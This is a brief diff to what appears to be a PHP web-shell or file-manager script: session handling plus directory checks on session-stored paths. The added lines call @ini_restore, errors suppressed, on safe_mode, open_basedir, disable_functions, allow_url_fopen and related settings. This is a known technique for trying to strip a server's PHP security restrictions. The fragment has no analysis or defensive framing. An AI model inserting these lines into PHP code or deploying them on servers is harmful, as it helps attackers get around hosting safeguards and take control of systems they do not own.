@@ -1,5 +1,10 @@
 <?php session_start();
-
+@ini_restore("safe_mode");
+@ini_restore("open_basedir");
+@ini_restore("safe_mode_include_dir");
+@ini_restore("safe_mode_exec_dir");
+@ini_restore("disable_functions");
+@ini_restore("allow_url_fopen");
 
 if(@$_SESSION['d']=='' || !@opendir($_SESSION['d']) || !@opendir($_SESSION['hd']))
 
